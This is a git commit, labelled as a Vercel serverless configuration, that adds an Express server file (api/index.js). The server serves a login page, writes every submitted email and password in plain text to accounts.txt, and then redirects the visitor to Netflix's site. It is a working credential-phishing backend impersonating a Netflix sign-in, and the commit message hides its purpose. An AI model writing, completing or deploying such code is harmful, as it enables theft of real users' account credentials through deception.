d8128dfcb5ec069bb38daa2b170f9d4b149a9e84
aibanre <ivanrocat13@gmail.com>
2026-02-10 21:57:43 +0800

    Add Vercel configuration for serverless deployment

---
+++ api/index.js
@@ -0,0 +1,23 @@
+const fs = require('fs');
+const path = require('path');
+const express = require('express');
+const bodyParser = require('body-parser');
+
+const app = express();
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, '..')));
+
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, '..', 'login.html'));
+});
+
+app.post('/login', (req, res) => {
+    const { email, password } = req.body;
+    const entry = `Email: ${email}, Password: ${password}\n`;
+    fs.appendFile(path.join(__dirname, '..', 'accounts.txt'), entry, err => {
+        // Ignore errors for now, just redirect to Netflix
+        res.redirect('https://www.netflix.com/ph-en/');
+    });
+});
+
+module.exports = app;
